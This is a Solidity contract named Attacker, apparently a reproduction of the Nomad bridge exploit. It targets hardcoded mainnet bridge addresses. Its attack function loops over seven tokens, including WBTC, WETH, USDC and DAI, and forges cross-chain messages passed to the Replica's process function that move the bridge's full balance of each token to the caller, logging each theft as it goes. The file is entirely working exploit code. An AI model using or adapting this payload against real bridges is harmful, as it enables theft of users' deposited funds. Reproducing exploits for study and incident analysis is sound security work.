// SPDX-License-Identifier: MIT
pragma solidity ^0.8.13;

import "@openzeppelin/token/ERC20/ERC20.sol";
import "forge-std/console.sol";

interface IReplica {
    function process(bytes memory _message) external returns (bool _success);
}

contract Attacker {
    address constant REPLICA = 0x5D94309E5a0090b165FA4181519701637B6DAEBA;
    address constant BRIDGE_ROUTER = 0xD3dfD3eDe74E0DCEBC1AA685e151332857efCe2d;
    address constant ERC20_BRIDGE = 0x88A69B4E698A4B090DF6CF5Bd7B2D47325Ad30A3;
    
    // Nomad domain IDs
    uint32 constant ETHEREUM = 0x657468;   // "eth"
    uint32 constant MOONBEAM = 0x6265616d; // "beam"

    // tokens
    address [] public tokens = [
        0x2260FAC5E5542a773Aa44fBCfeDf7C193bc2C599, // WBTC
        0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2, // WETH
        0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48, // USDC
        0xdAC17F958D2ee523a2206206994597C13D831ec7, // USDT
        0x6B175474E89094C44Da98b954EedeAC495271d0F, // DAI
        0x3432B6A60D23Ca0dFCa7761B7ab56459D9C964D0, // FRAX
        0xD417144312DbF50465b1C641d016962017Ef6240  // CQT
    ];

    function attack() external {
        for (uint i = 0; i < tokens.length; i++) {
            address token = tokens[i];
            uint256 amount_bridge = ERC20(token).balanceOf(ERC20_BRIDGE);

            console.log(
                "[*] Stealing",
                amount_bridge / 10**ERC20(token).decimals(),
                ERC20(token).symbol()
            );
            console.log(
                "    Attacker balance before:",
                ERC20(token).balanceOf(msg.sender)
            );

            // Generate the payload with all of the tokens stored on the bridge
            bytes memory payload = genPayload(msg.sender, token, amount_bridge);

            bool success = IReplica(REPLICA).process(payload);
            require(success, "Failed to process the payload");

            console.log(
                "    Attacker balance after: ",
                IERC20(token).balanceOf(msg.sender) / 10**ERC20(token).decimals()
            );
        }
    }

    function genPayload(
        address recipient,
        address token,
        uint256 amount
    ) internal pure returns (bytes memory payload) {
        payload = abi.encodePacked(
            MOONBEAM,                           // Home chain domain
            uint256(uint160(BRIDGE_ROUTER)),    // Sender: bridge
            uint32(0),                          // Dst nonce
            ETHEREUM,                           // Dst chain domain
            uint256(uint160(ERC20_BRIDGE)),     // Recipient (Nomad ERC20 bridge)
            ETHEREUM,                           // Token domain
            uint256(uint160(token)),          // token id (e.g. WBTC)
            uint8(0x3),                         // Type - transfer
            uint256(uint160(recipient)),      // Recipient of the transfer
            uint256(amount),                  // Amount
            uint256(0)                          // Optional: Token details hash
                                                // keccak256(                  
                                                //     abi.encodePacked(
                                                //         bytes(tokenName).length,
                                                //         tokenName,
                                                //         bytes(tokenSymbol).length,
                                                //         tokenSymbol,
                                                //         tokenDecimals
                                                //     )
                                                // ) 
        );
    }
}